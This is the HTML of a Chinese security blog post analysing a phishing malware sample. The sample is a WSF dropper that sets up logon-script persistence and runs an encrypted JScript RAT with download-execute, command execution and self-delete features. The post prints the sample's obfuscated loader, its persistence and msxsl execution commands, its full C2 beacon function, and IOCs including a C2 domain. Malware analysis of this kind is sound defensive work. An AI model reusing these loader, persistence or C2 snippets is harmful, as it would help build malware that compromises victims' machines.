@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="分析,恶意样本,">
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="分析,恶意样本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某钓鱼样本分析">
+<meta property="og:url" content="http://yoursite.com/2020/01/11/某钓鱼样本分析/index.html">
+<meta property="og:site_name" content="WBGlIl">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2020/01/11/C4BXY6xslQebGvF.jpg">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191222005305.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191222005814.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2020-01-11_20-58-52.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191222013525.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191222011654.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191222012028.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191223223605.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191223230051.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191223230557.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191223231338.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191223231507.png">
+<meta property="og:image" content="http://yoursite.com/images/20191223231917.png">
+<meta property="og:image" content="http://yoursite.com/images/ScreenShot_20191223233854.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-24_20-41-00.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-27_20-45-13.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-24_20-49-49.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-24_20-54-31.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-26_21-29-36.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-24_21-00-49.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-24_21-04-06.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-24_21-06-26.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-27_21-12-31.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-26_21-35-25.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-26_21-35-55.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-26_21-37-09.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-26_21-37-52.png">
+<meta property="og:image" content="http://yoursite.com/images/Snipaste_2019-12-26_21-38-31.png">
+<meta property="og:updated_time" content="2020-01-11T13:57:50.581Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="某钓鱼样本分析">
+<meta name="twitter:image" content="https://i.loli.net/2020/01/11/C4BXY6xslQebGvF.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/11/某钓鱼样本分析/">
+
+
+
+
+
+  <title>某钓鱼样本分析 | WBGlIl</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WBGlIl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/11/某钓鱼样本分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="WBGlIl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WBGlIl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">某钓鱼样本分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-11T20:41:53+08:00">
+                2020-01-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/分析/" itemprop="url" rel="index">
+                    <span itemprop="name">分析</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/分析/恶意样本/" itemprop="url" rel="index">
+                    <span itemprop="name">恶意样本</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://i.loli.net/2020/01/11/C4BXY6xslQebGvF.jpg" alt></p>
+<a id="more"></a>
+
+<h1 id="Job-Description-wsf文件分析"><a href="#Job-Description-wsf文件分析" class="headerlink" title="Job Description.wsf文件分析"></a>Job Description.wsf文件分析</h1><p>之前朋友发的链接就顺便看看</p>
+<p>文件是一个混淆过的WScript脚本文件<br>沙盒执行<br><img src="/images/ScreenShot_20191222005305.png" alt><br>释放7397.doc和342.ocx<br>启动word打开7397.doc并调用regsvr32.exe运行342.ocx<br><img src="/images/ScreenShot_20191222005814.png" alt></p>
+<p>文档截图<br><img src="/images/Snipaste_2020-01-11_20-58-52.png" alt><br>懒得去细看反正应该就是个什么表</p>
+<p>342.ocx<br>生成BC88E872ECBCD35DFDD834.txt(jscript),28851D604F592.txt(XSL),msxsl.exe这三个文件其中前两个文件名随机<br><img src="/images/ScreenShot_20191222013525.png" alt><br>设置注册表<br>key:HKEY_CURRENT_USER\Software\Microsoft\Notepad<br>Name:当前用户名<br>value:id+前面两个txt文件名用,分割</p>
+<p>设置注册表(使用Logon Scripts持久化)<br>key:HKEY_CURRENT_USER\Environment<br>name:UserInitMprLogonScript<br>value: <code>cscripT /B /e:jsCript &quot;%APPDATA%\Microsoft\BC88E872ECBCD35DFDD834.txt&quot;</code><br>调用msxsl.exe执行代码连接C2<br><code>msxsl.exe 28851D604F592.txt 28851D604F592.txt</code><br>调用cmd删除自身</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\cmd.exe /c del &quot;C:\Users\admin\AppData\Roaming\Microsoft\342.ocx&quot; &gt;&gt; NUL</span><br></pre></td></tr></table></figure>
+
+<h2 id="基本流程图"><a href="#基本流程图" class="headerlink" title="基本流程图"></a>基本流程图</h2><p><img src="/images/ScreenShot_20191222011654.png" alt></p>
+<h2 id="持久化分析"><a href="#持久化分析" class="headerlink" title="持久化分析"></a>持久化分析</h2><p>通过Logon Scripts方式到达持久化</p>
+<p>BC88E872ECBCD35DFDD834.txt文件混淆简单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var gwzx5707 = 0;try&#123;var gwzx86 = &apos;&quot;&apos;;var gwzx769515 = &quot;.&quot;;var gwzx59 = &quot;t&quot;;var gwzx657 = &quot;e&quot;;var gwzx73 = new ActiveXObject(&quot;WScrip&quot; + gwzx59 + gwzx769515 + &quot;Sh&quot; + gwzx657 + &quot;ll&quot;);var gwzx056 = &quot;x&quot;;var gwzx3636 = gwzx769515 + gwzx59 + gwzx056 + gwzx59;var gwzx786520 = gwzx769515 + gwzx657 + gwzx056 + gwzx657;var gwzx11 = &quot;\\&quot;;var gwzx7 = gwzx86 + &quot;C:&quot; + gwzx11 + &quot;Users&quot; + gwzx11 + &quot;admin&quot; + gwzx11 + &quot;AppData&quot; + gwzx11 + &quot;Roaming&quot; + gwzx11 + &quot;Microsoft&quot; + gwzx11 + &quot;&quot;;var gwzx581 = &quot;28851D604F592&quot;;var gwzx35270 = gwzx7 + &quot;ms&quot; + gwzx056 + &quot;sl&quot; + gwzx786520 + gwzx86 + &quot; &quot; + gwzx7 + gwzx581 + gwzx3636 + gwzx86 + &quot; &quot; + gwzx7 + gwzx581 + gwzx3636 + gwzx86;gwzx73.Run(gwzx35270, 0);&#125; catch(gwzx7566)&#123;gwzx5707 = 606;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ScreenShot_20191222012028.png" alt><br>使用WScript.Shell运行msxsl.exe执行28851D604F592.txt</p>
+<h2 id="28851D604F592-txt文件分析-jscript文件"><a href="#28851D604F592-txt文件分析-jscript文件" class="headerlink" title="28851D604F592.txt文件分析(jscript文件)"></a>28851D604F592.txt文件分析(jscript文件)</h2><p>这个文件是主要代码它的混淆比较严重<br><img src="/images/ScreenShot_20191223223605.png" alt><br>这两行是被加密的核心代码其中第二行的代码为rat代码，第一行的代码是用来解密第二行的。它加密算法应该是自己写的，js里解密函数差不多占整个文件的一半</p>
+<p>28851D604F592.txt这个文件是由342.ocx动态生成，而上面第二行加密的代码的密钥由342.ocx在运行时获取的用户名 PC名 处理器ID，然后把这三个值进行处理后作为密钥来加密rat核心代码，而上面的第一行代码在被解密执行后会在运行时会获取这三个值去解密rat核心代码然后启动rat核心代码</p>
+<p>首先调用解密函数gsdxqk072433解密gsdxqk1444变量<br><img src="/images/ScreenShot_20191223230051.png" alt><br>然后调用gsdxqk352函数执行解密后的代码<br><img src="/images/ScreenShot_20191223230557.png" alt><br>现在我们转到被解密的第一行代码，这里放出关键部分<br><img src="/images/ScreenShot_20191223231338.png" alt><br>其中gsdxqk535函数可以很明显的看出是用来获取pc名 用户名 处理器id这三个值的<br><img src="/images/ScreenShot_20191223231507.png" alt><br>然后让我们往下看<br><img src="/images/20191223231917.png" alt><br>可以看到在使用密钥对gsdxqk379459变量进行解密并且在使用gsdxqk352函数去执行解密后的代码</p>
+<h2 id="rat核心代码"><a href="#rat核心代码" class="headerlink" title="rat核心代码"></a>rat核心代码</h2><p>现在我们来分析一下rat核心代码<br><img src="/images/ScreenShot_20191223233854.png" alt><br>文件开头主要是定义了一些变量留到后面使用</p>
+<p>看到那个Gete变量我感觉这个rat控制端应该是web开发的</p>
+<p>开始执行<br><img src="/images/Snipaste_2019-12-24_20-41-00.png" alt><br>基本是初始化一些变量然后调用check_inside检测一下js文件环境变量等等</p>
+<p>check_inside函数部分截图<br><img src="/images/Snipaste_2019-12-27_20-45-13.png" alt></p>
+<p>检查结束后调用go检查网络情况c2情况如果失败就调用waitfor2等待一定时间后重新调用go函数成功就调用Main函数<br><img src="/images/Snipaste_2019-12-24_20-49-49.png" alt></p>
+<h3 id="Main函数"><a href="#Main函数" class="headerlink" title="Main函数"></a>Main函数</h3><p><img src="/images/Snipaste_2019-12-24_20-54-31.png" alt><br>基本流程就是收集系统信息发送系统信息然后判断返回根据返回的命令执行指定任务或进入等待函数然后等待一段时间后调用Main<br><img src="/images/Snipaste_2019-12-26_21-29-36.png" alt></p>
+<h3 id="bot-header获取系统信息"><a href="#bot-header获取系统信息" class="headerlink" title="bot_header获取系统信息"></a>bot_header获取系统信息</h3><p><img src="/images/Snipaste_2019-12-24_21-00-49.png" alt><br>小部分截图，这个函数里太tm多if了比如这样的<br><img src="/images/Snipaste_2019-12-24_21-04-06.png" alt><br>最后返回数据<br><img src="/images/Snipaste_2019-12-24_21-06-26.png" alt><br>末尾的BV应该是版本号</p>
+<h3 id="hit-Gate函数"><a href="#hit-Gate函数" class="headerlink" title="hit_Gate函数"></a>hit_Gate函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">function hit_Gate(URL, POSTdata, gResponse, method) &#123;</span><br><span class="line">    var Resp = &quot;&quot;;</span><br><span class="line">    var Temp89 = &quot;&quot;;</span><br><span class="line">    var con4;</span><br><span class="line">    var respzz;</span><br><span class="line">    if (SYSTEM === 1) &#123;</span><br><span class="line">        con4 = xhr;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (method === 1) &#123;</span><br><span class="line">            con4 = xhr;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            con4 = con;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        con4.open(&quot;POST&quot;, URL, false);</span><br><span class="line">    &#125; catch(e10) &#123;</span><br><span class="line">        if (SYSTEM === 0 &amp;&amp; method === 0) &#123;</span><br><span class="line">            return hit_Gate(URL, POSTdata, gResponse, 1);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &quot;gErr&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (gResponse === 1) &#123;</span><br><span class="line">        con4.onreadystatechange = function() &#123;</span><br><span class="line">            if (con4.readyState === 4) &#123;</span><br><span class="line">                if (con4.status === 200) &#123;</span><br><span class="line">                    respzz = con4.responseText;</span><br><span class="line">                    if (respzz) &#123;</span><br><span class="line">                        Temp89 = base91_decode(respzz);</span><br><span class="line">                        if (Temp89) &#123;</span><br><span class="line">                            var wo = Temp89.substr(0, Temp89.length - 2);</span><br><span class="line">                            var KeyNow = Temp89.substr(Temp89.length - 2);</span><br><span class="line">                            Resp = zzzz4(Rkey + KeyNow, wo);</span><br><span class="line">                            if (Resp) &#123;</span><br><span class="line">                                respzz = &quot;&quot;;</span><br><span class="line">                            &#125; else &#123;</span><br><span class="line">                                Resp = &quot;gErr&quot;;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            Resp = &quot;gErr&quot;;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        Resp = &quot;OK&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    Resp = &quot;gErr&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    var keynow = rStr(2);</span><br><span class="line">    var rNow = rInt(8, 32);</span><br><span class="line">    var not_unique = POSTdata + &quot;|&quot; + rStr(rNow) + &quot;|&quot;;</span><br><span class="line">    var xCrypted = zzzz4(Rkey + keynow, not_unique) + keynow;</span><br><span class="line">    var encoded = base91_encode(xCrypted);</span><br><span class="line">    var g11 = 0;</span><br><span class="line">    if (SYSTEM === 1 || method === 1) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            con4.setOption(2, 13056);</span><br><span class="line">        &#125; catch(e411) &#123;</span><br><span class="line">            g11 = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        con4.send(encoded);</span><br><span class="line">    &#125; catch(e11) &#123;</span><br><span class="line">        if (SYSTEM === 0 &amp;&amp; method === 0) &#123;</span><br><span class="line">            return hit_Gate(URL, POSTdata, gResponse, 1);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &quot;gErr&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (gResponse === 1) &#123;</span><br><span class="line">        return Resp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发送数据获取任务返回给Main函数然后判断是否有任务如果有则调用eTask无则进入等待函数waitfor<br><img src="/images/Snipaste_2019-12-27_21-12-31.png" alt></p>
+<h2 id="eTask"><a href="#eTask" class="headerlink" title="eTask"></a>eTask</h2><p>任务执行函数，一共实现了6个功能<br><img src="/images/Snipaste_2019-12-26_21-35-25.png" alt><br>下载执行exe或dll<br><img src="/images/Snipaste_2019-12-26_21-35-55.png" alt><br>更新程序<br><img src="/images/Snipaste_2019-12-26_21-37-09.png" alt><br>自删除<br><img src="/images/Snipaste_2019-12-26_21-37-52.png" alt><br>重启程序<br><img src="/images/Snipaste_2019-12-26_21-38-31.png" alt><br>执行cmd不返回结果或返回结果</p>
+<h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><p>MD5<br>F2C17BE8CDAABBC4C596BABB076AB22B</p>
+<p>domain<br>dcc.experientialcentral.com</p>
+<p>链接:<br><a href="https://twitter.com/SBousseaden/status/1208000088875978753" target="_blank" rel="noopener">https://twitter.com/SBousseaden/status/1208000088875978753</a></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>本来是想之前就更新博客的但是因为种种原因一直没写,天气太冷都不想动了哈哈</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/分析/" rel="tag"># 分析</a>
+          
+            <a href="/tags/恶意样本/" rel="tag"># 恶意样本</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/17/IIS-backdoor/" rel="next" title="IIS backdoor">
+                <i class="fa fa-chevron-left"></i> IIS backdoor
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/15/go语言结合反射dll技术/" rel="prev" title="go语言结合反射dll技术">
+                go语言结合反射dll技术 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="WBGlIl">
+            
+              <p class="site-author-name" itemprop="name">WBGlIl</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                大佬们的博客
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sariel.top/" title="只因不值得" target="_blank">只因不值得</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ggsec.cn/" title="Demon" target="_blank">Demon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secist.com/" title="即刻安全" target="_blank">即刻安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nek0y4nsu.github.io/" title="Yansu" target="_blank">Yansu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blue-bird1.github.io/" title="青鸟" target="_blank">青鸟</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://qwq.moe/" title="蚊子の博客" target="_blank">蚊子の博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://9bie.org/" title="biebie" target="_blank">biebie</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Job-Description-wsf文件分析"><span class="nav-number">1.</span> <span class="nav-text">Job Description.wsf文件分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本流程图"><span class="nav-number">1.1.</span> <span class="nav-text">基本流程图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#持久化分析"><span class="nav-number">1.2.</span> <span class="nav-text">持久化分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#28851D604F592-txt文件分析-jscript文件"><span class="nav-number">1.3.</span> <span class="nav-text">28851D604F592.txt文件分析(jscript文件)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rat核心代码"><span class="nav-number">1.4.</span> <span class="nav-text">rat核心代码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Main函数"><span class="nav-number">1.4.1.</span> <span class="nav-text">Main函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bot-header获取系统信息"><span class="nav-number">1.4.2.</span> <span class="nav-text">bot_header获取系统信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hit-Gate函数"><span class="nav-number">1.4.3.</span> <span class="nav-text">hit_Gate函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eTask"><span class="nav-number">1.5.</span> <span class="nav-text">eTask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IOC"><span class="nav-number">1.6.</span> <span class="nav-text">IOC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最后"><span class="nav-number">1.7.</span> <span class="nav-text">最后</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WBGlIl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
